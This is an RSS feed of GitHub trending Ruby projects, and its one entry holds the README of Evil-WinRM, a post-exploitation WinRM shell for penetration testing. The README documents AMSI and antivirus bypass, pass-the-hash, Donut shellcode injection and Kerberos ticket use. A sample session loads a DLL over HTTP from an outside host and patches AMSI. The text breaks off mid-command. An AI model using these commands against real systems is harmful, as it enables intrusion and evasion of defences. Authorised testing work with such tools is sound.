<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Ruby Weekly Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-04-30T02:05:40Z</updated>
  <subtitle>Weekly Trending of Ruby in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>Hackplayers/evil-winrm</title>
    <updated>2023-04-30T02:05:40Z</updated>
    <id>tag:github.com,2023-04-30:/Hackplayers/evil-winrm</id>
    <link href="https://github.com/Hackplayers/evil-winrm" rel="alternate"></link>
    <summary type="html">&lt;p&gt;The ultimate WinRM shell for hacking/pentesting&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Evil-WinRM &lt;a href=&#34;https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/evil-winrm.rb&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/version-3.5-blue.svg?style=flat-square&amp;amp;colorA=273133&amp;amp;colorB=0093ee&#34; alt=&#34;Version-shield&#34; title=&#34;Latest version&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.ruby-lang.org/en/news/2015/12/25/ruby-2-3-0-released/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/ruby-2.3%2B-blue.svg?style=flat-square&amp;amp;colorA=273133&amp;amp;colorB=ff0000&#34; alt=&#34;Ruby2.3-shield&#34; title=&#34;Ruby 2.3 or later&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://rubygems.org/gems/evil-winrm&#34;&gt;&lt;img src=&#34;https://badge.fury.io/rb/evil-winrm.svg?sanitize=true&#34; alt=&#34;Gem-Version&#34; title=&#34;Ruby gem&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/LICENSE&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/license-LGPL%20v3%2B-blue.svg?style=flat-square&amp;amp;colorA=273133&amp;amp;colorB=bd0000&#34; alt=&#34;License-shield&#34; title=&#34;LGPL v3+&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://hub.docker.com/r/oscarakaelvis/evil-winrm&#34;&gt;&lt;img src=&#34;https://img.shields.io/docker/cloud/automated/oscarakaelvis/evil-winrm.svg?style=flat-square&amp;amp;colorA=273133&amp;amp;colorB=a9a9a9&#34; alt=&#34;Docker-shield&#34; title=&#34;Docker rules!&#34;&gt;&lt;/a&gt;&lt;/h1&gt; &#xA;&lt;p&gt;The ultimate WinRM shell for hacking/pentesting&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/resources/evil-winrm_logo.png&#34; alt=&#34;Banner&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Description &amp;amp; Purpose&lt;/h2&gt; &#xA;&lt;p&gt;This shell is the ultimate WinRM shell for hacking/pentesting.&lt;/p&gt; &#xA;&lt;p&gt;WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating Systems in order to make life easier to system administrators.&lt;/p&gt; &#xA;&lt;p&gt;This program can be used on any Microsoft Windows Servers with this feature enabled (usually at port 5985), of course only if you have credentials and permissions to use it. So we can say that it could be used in a post-exploitation hacking/pentesting phase. The purpose of this program is to provide nice and easy-to-use features for hacking. It can be used with legitimate purposes by system administrators as well but the most of its features are focused on hacking/pentesting stuff.&lt;/p&gt; &#xA;&lt;p&gt;It is based mainly in the WinRM Ruby library which changed its way to work since its version 2.0. Now instead of using WinRM protocol, it is using PSRP (Powershell Remoting Protocol) for initializing runspace pools as well as creating and processing pipelines.&lt;/p&gt; &#xA;&lt;h2&gt;Features&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Compatible to Linux and Windows client systems&lt;/li&gt; &#xA; &lt;li&gt;Load in memory Powershell scripts&lt;/li&gt; &#xA; &lt;li&gt;Load in memory dll files bypassing some AVs&lt;/li&gt; &#xA; &lt;li&gt;Load in memory C# (C Sharp) assemblies bypassing some AVs&lt;/li&gt; &#xA; &lt;li&gt;Load x64 payloads generated with awesome &lt;a href=&#34;https://github.com/TheWover/donut&#34;&gt;donut&lt;/a&gt; technique&lt;/li&gt; &#xA; &lt;li&gt;Dynamic AMSI Bypass to avoid AV signatures&lt;/li&gt; &#xA; &lt;li&gt;Pass-the-hash support&lt;/li&gt; &#xA; &lt;li&gt;Kerberos auth support&lt;/li&gt; &#xA; &lt;li&gt;SSL and certificates support&lt;/li&gt; &#xA; &lt;li&gt;Upload and download files showing progress bar&lt;/li&gt; &#xA; &lt;li&gt;List remote machine services without privileges&lt;/li&gt; &#xA; &lt;li&gt;Command History&lt;/li&gt; &#xA; &lt;li&gt;WinRM command completion&lt;/li&gt; &#xA; &lt;li&gt;Local files/directories completion&lt;/li&gt; &#xA; &lt;li&gt;Remote path (files/directories) completion (can be disabled optionally)&lt;/li&gt; &#xA; &lt;li&gt;Colorization on prompt and output messages (can be disabled optionally)&lt;/li&gt; &#xA; &lt;li&gt;Optional logging feature&lt;/li&gt; &#xA; &lt;li&gt;Docker support (prebuilt images available at &lt;a href=&#34;https://hub.docker.com/r/oscarakaelvis/evil-winrm&#34;&gt;Dockerhub&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Trap capturing to avoid accidental shell exit on Ctrl+C&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Help&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]&#xA;    -S, --ssl                        Enable ssl&#xA;    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate&#xA;    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate&#xA;    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -&amp;gt; CONTOSO.COM = { kdc = fooserver.contoso.com }&#xA;    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path&#xA;        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)&#xA;    -e, --executables EXES_PATH      C# executables local path&#xA;    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)&#xA;    -U, --url URL                    Remote url endpoint (default /wsman)&#xA;    -u, --user USER                  Username (required if not using kerberos)&#xA;    -p, --password PASS              Password&#xA;    -H, --hash HASH                  NTHash&#xA;    -P, --port PORT                  Remote host port (default 5985)&#xA;    -V, --version                    Show version&#xA;    -n, --no-colors                  Disable colors&#xA;    -N, --no-rpath-completion        Disable remote path completion&#xA;    -l, --log                        Log the WinRM session&#xA;    -h, --help                       Display this help message&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Requirements&lt;/h2&gt; &#xA;&lt;p&gt;Ruby 2.3 or higher is needed. Some ruby gems are needed as well: &lt;code&gt;winrm &amp;gt;=2.3.2&lt;/code&gt;, &lt;code&gt;winrm-fs &amp;gt;=1.3.2&lt;/code&gt;, &lt;code&gt;stringio &amp;gt;=0.0.2&lt;/code&gt;, &lt;code&gt;logger &amp;gt;= 1.4.3&lt;/code&gt;, &lt;code&gt;fileutils &amp;gt;= 0.7.2&lt;/code&gt;. Depending of your installation method (4 availables) the installation of them could be required to be done manually.&lt;/p&gt; &#xA;&lt;p&gt;Another important requirement only used for Kerberos auth is to install the Kerberos package used for network authentication. For some Linux like Debian based (Kali, Parrot, etc.) it is called &lt;code&gt;krb5-user&lt;/code&gt;. For BlackArch it is called &lt;code&gt;krb5&lt;/code&gt; and probably it could be called in a different way for other Linux distributions.&lt;/p&gt; &#xA;&lt;p&gt;The remote path completion feature will work only if your ruby was compiled enabling the &lt;code&gt;--with-readline-dir&lt;/code&gt; flag. This is enabled by default in ruby included on some Linux distributions but not in all. Check &lt;a href=&#34;https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/#Remote-path-completion&#34;&gt;the section below&lt;/a&gt; for more info.&lt;/p&gt; &#xA;&lt;h2&gt;Installation &amp;amp; Quick Start (4 methods)&lt;/h2&gt; &#xA;&lt;h3&gt;Method 1. Installation directly as ruby gem (dependencies will be installed automatically on your system)&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Step 1. Install it (it will install automatically dependencies): &lt;code&gt;gem install evil-winrm&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Step 2. Ready. Just launch it!&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;evil-winrm  -i 192.168.1.100 -u Administrator -p &#39;MySuperSecr3tPass123!&#39; -s &#39;/home/foo/ps1_scripts/&#39; -e &#39;/home/foo/exe_files/&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Method 2. Git clone and install dependencies on your system manually&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Step 1. Install dependencies manually: &lt;code&gt;sudo gem install winrm winrm-fs stringio logger fileutils&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Step 2. Clone the repo: &lt;code&gt;git clone https://github.com/Hackplayers/evil-winrm.git&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Step 3. Ready. Just launch it!&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;cd evil-winrm &amp;amp;&amp;amp; ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p &#39;MySuperSecr3tPass123!&#39; -s &#39;/home/foo/ps1_scripts/&#39; -e &#39;/home/foo/exe_files/&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Method 3. Using bundler (dependencies will not be installed on your system, just to use evil-winrm)&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Step 1. Install bundler: &lt;code&gt;gem install bundler&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Step 2. Clone the repo: &lt;code&gt;git clone https://github.com/Hackplayers/evil-winrm.git&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Step 3. Install dependencies with bundler: &lt;code&gt;cd evil-winrm &amp;amp;&amp;amp; bundle install --path vendor/bundle&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Step 4. Launch it with bundler:&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;bundle exec evil-winrm.rb -i 192.168.1.100 -u Administrator -p &#39;MySuperSecr3tPass123!&#39; -s &#39;/home/foo/ps1_scripts/&#39; -e &#39;/home/foo/exe_files/&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Method 4. Using Docker&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Step 1. Launch docker container based on already built image:&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;docker run --rm -ti --name evil-winrm -v /home/foo/ps1_scripts:/ps1_scripts -v /home/foo/exe_files:/exe_files -v /home/foo/data:/data oscarakaelvis/evil-winrm -i 192.168.1.100 -u Administrator -p &#39;MySuperSecr3tPass123!&#39; -s &#39;/ps1_scripts/&#39; -e &#39;/exe_files/&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Documentation&lt;/h2&gt; &#xA;&lt;h3&gt;Clear text password&lt;/h3&gt; &#xA;&lt;p&gt;If you don&#39;t want to put the password in clear text, you can optionally avoid to set &lt;code&gt;-p&lt;/code&gt; argument and the password will be prompted preventing to be shown.&lt;/p&gt; &#xA;&lt;h3&gt;Ipv6&lt;/h3&gt; &#xA;&lt;p&gt;To use IPv6, the address must be added to /etc/hosts. Just put the already set name of the host after &lt;code&gt;-i&lt;/code&gt; argument instead of an IP address.&lt;/p&gt; &#xA;&lt;h3&gt;Basic commands&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;upload&lt;/strong&gt;: local files can be auto-completed using tab key. &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;usage: &lt;code&gt;upload local_filename&lt;/code&gt; or &lt;code&gt;upload local_filename destination_filename&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;download&lt;/strong&gt;: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;usage: &lt;code&gt;download remote_filename&lt;/code&gt; or &lt;code&gt;download remote_filename destination_filename&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Notes about paths (upload/download)&lt;/strong&gt;: Relative paths are not allowed to use on download/upload. Use filenames on current directory or absolute path. If you are using Evil-WinRM in a docker environment, bear in mind that all local paths should be at &lt;code&gt;/data&lt;/code&gt; and be pretty sure that you mapped it as a volume in order to be able to access to downloaded files or to be able to upload files from your local host O.S.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;services&lt;/strong&gt;: list all services showing if there your account has permissions over each one. No administrator permissions needed to use this feature.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;menu&lt;/strong&gt;: load the &lt;code&gt;Invoke-Binary&lt;/code&gt;, &lt;code&gt;Dll-Loader&lt;/code&gt; and &lt;code&gt;Donut-Loader&lt;/code&gt; functions that we will explain below. When a ps1 is loaded all its functions will be shown up.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;*Evil-WinRM* PS C:\&amp;gt; menu&#xA;&#xA;   ,.   (   .      )               &#34;            ,.   (   .      )       .&#xA;  (&#34;  (  )  )&#39;     ,&#39;             (     &#39;    (&#34;     )  )&#39;     ,&#39;   .  ,)&#xA;.; )  &#39; (( (&#34; )    ;(,      .     ;)  &#34;  )&#34;  .; )  &#39; (( (&#34; )   );(,   )((&#xA;_&#34;.,_,.__).,) (.._( ._),     )  , (._..( &#39;.._&#34;._, . &#39;._)_(..,_(_&#34;.) _( _&#39;)&#xA;\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \&#xA; |    __)_\  \/ /  |  |    ;_)_&#39;) \   \/\/   /  |/    \|       _/ /  \ /  \&#xA; |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \&#xA;/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /&#xA;        \/                               \/          \/       \/         \/&#xA;&#xA;          By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers&#xA;&#xA;[+] Dll-Loader&#xA;[+] Donut-Loader&#xA;[+] Invoke-Binary&#xA;[+] Bypass-4MSI&#xA;[+] services&#xA;[+] upload&#xA;[+] download&#xA;[+] menu&#xA;[+] exit&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Load powershell scripts&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;To load a ps1 file you just have to type the name (auto-completion using tab allowed). The scripts must be in the path set at &lt;code&gt;-s&lt;/code&gt; argument. Type menu again and see the loaded functions. Very large files can take a long time to be loaded.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;*Evil-WinRM* PS C:\&amp;gt; PowerView.ps1&#xA;*Evil-WinRM* PS C:\&amp;gt; menu&#xA;&#xA;   ,.   (   .      )               &#34;            ,.   (   .      )       .&#xA;  (&#34;  (  )  )&#39;     ,&#39;             (     &#39;    (&#34;     )  )&#39;     ,&#39;   .  ,)&#xA;.; )  &#39; (( (&#34; )    ;(,      .     ;)  &#34;  )&#34;  .; )  &#39; (( (&#34; )   );(,   )((&#xA;_&#34;.,_,.__).,) (.._( ._),     )  , (._..( &#39;.._&#34;._, . &#39;._)_(..,_(_&#34;.) _( _&#39;)&#xA;\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \&#xA; |    __)_\  \/ /  |  |    ;_)_&#39;) \   \/\/   /  |/    \|       _/ /  \ /  \&#xA; |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \&#xA;/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /&#xA;        \/                               \/          \/       \/         \/&#xA;&#xA;          By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers&#xA;&#xA;[+] Add-DomainAltSecurityIdentity&#xA;[+] Add-DomainGroupMember&#xA;[+] Add-DomainObjectAcl&#xA;[+] Add-RemoteConnection&#xA;[+] Add-Win32Type&#xA;[+] Convert-ADName&#xA;[+] Convert-DNSRecord&#xA;[+] ConvertFrom-LDAPLogonHours&#xA;[+] ConvertFrom-SID&#xA;[+] ConvertFrom-UACValue&#xA;[+] Convert-LDAPProperty&#xA;[+] Convert-LogonHours&#xA;[+] ConvertTo-SID&#xA;[+] Dll-Loader&#xA;[+] Donut-Loader&#xA;[+] Export-PowerViewCSV&#xA;[+] field&#xA;[+] Find-DomainLocalGroupMember&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Advanced commands&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Invoke-Binary: allows .Net assemblies to be executed in memory. The name can be auto-completed using tab key. Arguments for the exe file can be passed comma separated. Example: &lt;code&gt;Invoke-Binary /opt/csharp/Binary.exe &#39;param1, param2, param3&#39;&lt;/code&gt;. The executables must be in the path set at &lt;code&gt;-e&lt;/code&gt; argument.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;*Evil-WinRM* PS C:\&amp;gt; Invoke-Binary&#xA;.SYNOPSIS&#xA;    Execute binaries from memory.&#xA;    PowerShell Function: Invoke-Binary&#xA;    Author: Luis Vacas (CyberVaca)&#xA;&#xA;    Required dependencies: None&#xA;    Optional dependencies: None&#xA;.DESCRIPTION&#xA;&#xA;.EXAMPLE&#xA;    Invoke-Binary /opt/csharp/Watson.exe&#xA;    Invoke-Binary /opt/csharp/Binary.exe param1,param2,param3&#xA;    Invoke-Binary /opt/csharp/Binary.exe &#39;param1, param2, param3&#39;&#xA;    Description&#xA;    -----------&#xA;    Function that execute binaries from memory.&#xA;&#xA;*Evil-WinRM* PS C:\&amp;gt; Invoke-Binary /opt/csharp/Rubeus.exe&#xA;&#xA;   ______        _&#xA;  (_____ \      | |&#xA;   _____) )_   _| |__  _____ _   _  ___&#xA;  |  __  /| | | |  _ \| ___ | | | |/___)&#xA;  | |  \ \| |_| | |_) ) ____| |_| |___ |&#xA;  |_|   |_|____/|____/|_____)____/(___/&#xA;&#xA;  v2.0.0&#xA;&#xA;&#xA; Ticket requests and renewals:&#xA;&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Dll-Loader: allows loading dll libraries in memory, it is equivalent to: &lt;code&gt;[Reflection.Assembly]::Load([IO.File]::ReadAllBytes(&#34;pwn.dll&#34;))&lt;/code&gt;&lt;/p&gt; &lt;p&gt;The dll file can be hosted by smb, http or locally. Once it is loaded type &lt;code&gt;menu&lt;/code&gt;, then it is possible to autocomplete all functions.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;*Evil-WinRM* PS C:\&amp;gt; Dll-Loader&#xA;.SYNOPSIS&#xA;    dll loader.&#xA;    PowerShell Function: Dll-Loader&#xA;    Author: Hector de Armas (3v4Si0N)&#xA;&#xA;    Required dependencies: None&#xA;    Optional dependencies: None&#xA;.DESCRIPTION&#xA;    .&#xA;.EXAMPLE&#xA;    Dll-Loader -smb -path \\192.168.139.132\\share\\myDll.dll&#xA;    Dll-Loader -local -path C:\Users\Pepito\Desktop\myDll.dll&#xA;    Dll-Loader -http -path http://example.com/myDll.dll&#xA;&#xA;    Description&#xA;    -----------&#xA;    Function that loads an arbitrary dll&#xA;&#xA;*Evil-WinRM* PS C:\&amp;gt; Dll-Loader -http http://10.10.10.10/SharpSploit.dll&#xA;[+] Reading dll by HTTP&#xA;[+] Loading dll...&#xA;*Evil-WinRM* PS C:\Users\test\Documents&amp;gt; menu&#xA;&#xA; [... Snip ...]&#xA;&#xA;*Evil-WinRM* PS C:\&amp;gt; [SharpSploit.Enumeration.Host]::GetProcessList()&#xA;&#xA;&#xA;Pid          : 0&#xA;Ppid         : 0&#xA;Name         : Idle&#xA;Path         :&#xA;SessionID    : 0&#xA;Owner        :&#xA;Architecture : x64&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Donut-Loader: allows to inject x64 payloads generated with awesome &lt;a href=&#34;https://github.com/TheWover/donut&#34;&gt;donut&lt;/a&gt; technique. No need to encode the payload.bin, just generate and inject!&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;*Evil-WinRM* PS C:\&amp;gt; Donut-Loader&#xA;.SYNOPSIS&#xA;    Donut Loader.&#xA;    PowerShell Function: Donut-Loader&#xA;    Author: Luis Vacas (CyberVaca)&#xA;    Based code: TheWover&#xA;&#xA;    Required dependencies: None&#xA;    Optional dependencies: None&#xA;.DESCRIPTION&#xA;&#xA;.EXAMPLE&#xA;    Donut-Loader -process_id 2195 -donutfile /home/cybervaca/donut.bin&#xA;    Donut-Loader -process_id (get-process notepad).id -donutfile /home/cybervaca/donut.bin&#xA;&#xA;    Description&#xA;    -----------&#xA;    Function that loads an arbitrary donut :D&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can use this &lt;a href=&#34;https://github.com/Hackplayers/Salsa-tools/raw/master/Donut-Maker/donut-maker.py&#34;&gt;donut-maker&lt;/a&gt; to generate the payload.bin if you don&#39;t use Windows. This script use a python module written by Marcello Salvati (&lt;a href=&#34;https://twitter.com/byt3bl33d3r&#34;&gt;byt3bl33d3r&lt;/a&gt;). It could be installed using pip: &lt;code&gt;pip3 install donut-shellcode&lt;/code&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;python3 donut-maker.py -i Covenant.exe&#xA;&#xA;   ___  _____&#xA; .&#39;/,-Y&#34;     &#34;~-.&#xA; l.Y             ^.&#xA; /\               _\_      Donuts!&#xA;i            ___/&#34;   &#34;\&#xA;|          /&#34;   &#34;\   o !&#xA;l         ]     o !__./&#xA; \ _  _    \.___./    &#34;~\&#xA;  X \/ \            ___./&#xA; ( \ ___.   _..--~~&#34;   ~`-.&#xA;  ` Z,--   /               \&#xA;    \__.  (   /       ______)&#xA;      \   l  /-----~~&#34; /&#xA;       Y   \          /&#xA;       |    &#34;x______.^&#xA;       |           \&#xA;       j            Y&#xA;&#xA;&#xA;&#xA;[+] Donut generated successfully: payload.bin&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Bypass-4MSI: patchs AMSI protection.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;*Evil-WinRM* PS C:\&amp;gt; #amsiscanbuffer&#xA;At line:1 char:1&#xA;+ #amsiscanbuffer&#xA;+ ~~~~~~~~~~~~~~~&#xA;This script contains malicious content and has been blocked by your antivirus software.&#xA;    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException&#xA;    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand&#xA;*Evil-WinRM* PS C:\&amp;gt;&#xA;*Evil-WinRM* PS C:\&amp;gt; Bypass-4MSI&#xA;[+] Success!&#xA;&#xA;*Evil-WinRM* PS C:\&amp;gt; #amsiscanbuffer&#xA;*Evil-WinRM* PS C:\&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Kerberos&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;First you have to sync date with the DC: &lt;code&gt;rdate -n &amp;lt;dc_ip&amp;gt;&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;To generate ticket there are many ways:&lt;/p&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;Using &lt;a href=&#34;https://github.com/SecureAuthCorp/impacket/raw/master/examples/ticketer.py&#34;&gt;ticketer.py&lt;/a&gt; from impacket&lt;/li&gt; &#xA;   &lt;li&gt;If you get a kirbi ticket using &lt;a href=&#34;https://github.com/GhostPack/Rubeus&#34;&gt;Rubeus&lt;/a&gt; or &lt;a href=&#34;https://github.com/gentilkiwi/mimikatz&#34;&gt;Mimikatz&lt;/a&gt; you have to convert to ccache using &lt;a href=&#34;https://github.com/Zer1t0/ticket_converter&#34;&gt;ticket_converter.py&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Add ccache ticket. There are 2 ways:&lt;/p&gt; &lt;p&gt;&lt;code&gt;export KRB5CCNAME=/foo/var/ticket.ccache&lt;/code&gt;&lt;/p&gt; &lt;p&gt;&lt;code&gt;cp ticket.ccache /tmp/krb5cc_0&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Add realm to &lt;code&gt;/etc/krb5.conf&lt;/code&gt; (for linux). Use of this format is important:&lt;/p&gt; &lt;pre&gt;&lt;code&gt; CONTOSO.COM = {&#xA;             kdc = fooserver.contoso.com&#xA; }&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Check Kerberos tickets with &lt;code&gt;klist&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;To remove ticket use: &lt;code&gt;kdestroy&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;For more information about Kerberos check this &lt;a href=&#34;https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a&#34;&gt;cheatsheet&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Remote path completion&lt;/h3&gt; &#xA;&lt;p&gt;This feature could be not available depending of the ruby you are using. It must be compiled with readline support. Otherwise, this feature will not work (a warning will be shown).&lt;/p&gt; &#xA;&lt;h4&gt;Method 1 (compile the needed extension)&lt;/h4&gt; &#xA;&lt;p&gt;Using this method you&#39;ll compile ruby with the needed readline feature but to use only the library without changing the default ruby version on your system. Because of this, is the most recommended method.&lt;/p&gt; &#xA;&lt;p&gt;Let&#39;s suppose that you have in your Debian based system ruby 2.7.3:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# Install needed package&#xA;apt install libreadline-dev&#xA;&#xA;# Check your ruby version&#xA;ruby --version&#xA;ruby 2.7.3p183 (2021-04-05 revision 6847ee089d) [x86_64-linux-gnu]&#xA;&#xA;# Download ruby source code (2.7.3 in this case):&#xA;wget https://ftp.ruby-lang.org/pub/ruby/2.7/ruby-2.7.3.tar.gz&#xA;&#xA;# Extract source code&#xA;tar -xf ruby-2.7.3.tar.gz&#xA;&#xA;# Compile the readline extension:&#xA;cd ruby-2.7.3/ext/readline&#xA;ruby ./extconf.rb&#xA;make&#xA;&#xA;# Patch current version of the ruby readline extension:&#xA;sudo cp /usr/lib/x86_64-linux-gnu/ruby/2.7.0/readline.so /usr/lib/x86_64-linux-gnu/ruby/2.7.0/readline.so.bk&#xA;sudo cp -f readline.so /usr/lib/x86_64-linux-gnu/ruby/2.7.0/readline.so&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Method 2 (Install ruby to use it only for evil-winrm using rbenv)&lt;/h4&gt; &#xA;&lt;p&gt;Let&#39;s suppose that you want ruby 2.7.1 on a Debian based Linux and you are using zsh. This script will automatize it. You&#39;ll need to launch it from the same dir where evil-winrm.rb and Gemfile is located (the evil-winrm created dir after a git clone for example):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;#!/usr/bin/env zsh&#xA;&#xA;# Uninstall possible current installed versions&#xA;sudo gem uninstall evil-winrm -q&#xA;gem uninstall evil-winrm -q&#xA;&#xA;# Install rbenv&#xA;sudo apt install rbenv&#xA;&#xA;# Config rbenv on zshrc config file&#xA;echo &#39;export PATH=&#34;$HOME/.rbenv/bin:$PATH&#34;&#39; &amp;gt;&amp;gt; ~/.zshrc&#xA;echo &#39;eval &#34;$(rbenv init -)&#34;&#39; &amp;gt;&amp;gt; ~/.zshrc&#xA;source ~/.zshrc&#xA;&#xA;# Install ruby with readline support&#xA;export RUBY_CONFIGURE_OPTS=--with-readline-dir=&#34;/usr/include/readline&#34;&#xA;rbenv install 2.7.1&#xA;&#xA;# Create file &#39;.ruby-version&#39; to set right ruby version&#xA;rbenv local 2.7.1&#xA;&#xA;# Install local gems&#xA;gem install bundler&#xA;bundle install&#xA;&#xA;current_evwr=&#34;$(pwd)/evil-winrm.rb&#34;&#xA;&#xA;sudo bash -c &#34;cat &amp;lt;&amp;lt; &#39;EOF&#39; &amp;gt; /usr/bin/evil-winrm&#xA;    #!/usr/bin/env sh&#xA;    &#34;${current_evwr}&#34; &#34;\$@&#34;&#xA;EOF&#34;&#xA;&#xA;sudo chmod +x 